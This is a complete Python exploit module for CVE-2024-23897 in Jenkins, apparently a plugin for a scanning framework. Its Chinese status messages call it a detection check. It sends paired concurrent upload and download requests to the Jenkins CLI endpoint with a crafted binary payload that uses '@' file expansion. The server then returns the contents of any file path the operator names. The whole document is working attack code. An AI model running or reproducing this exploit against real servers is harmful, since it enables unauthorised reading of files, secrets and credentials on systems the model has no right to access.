#!/user/bin/env python3
# -*- coding: utf-8 -*-

import threading
import http.client
import uuid
import urllib.parse
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc

class Cve_2024_23897:

    def send_download_request(self,target_info, uuid_str):
        try:
            conn = http.client.HTTPConnection(target_info.netloc)
            conn.request("POST", "/cli?remoting=false", headers={
                "Session": uuid_str,
                "Side": "download"
            })
            response = conn.getresponse().read()
            OutPrintInfoSuc("Jenkins", f"RESPONSE from {target_info.netloc}: \n{response}")
        except Exception as e:
            OutPrintInfo("Jenkins","目标请求出错")

    def send_upload_request(self,target_info, uuid_str, data):
        try:
            conn = http.client.HTTPConnection(target_info.netloc)
            conn.request("POST", "/cli?remoting=false", headers={
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream"
            }, body=data)
        except Exception as e:
            OutPrintInfo("Jenkins","目标请求出错")


    def launch_exploit(self,formatted_url, file_path):
        target_info = urllib.parse.urlparse(formatted_url)
        uuid_str = str(uuid.uuid4())
        data = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' + file_path.encode() + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'

        upload_thread = threading.Thread(target=self.send_upload_request, args=(target_info, uuid_str, data))
        download_thread = threading.Thread(target=self.send_download_request, args=(target_info, uuid_str))

        upload_thread.start()
        download_thread.start()

        upload_thread.join()
        download_thread.join()



    def main(self,target):
        url = target["url"].strip('/ ')
        file = target["file"]
        OutPrintInfo("Jenkins", "开始检测Jenkins任意文件读取...")
        self.launch_exploit(url, file)
        OutPrintInfo("Jenkins", "Jenkins任意文件读取检测结束")


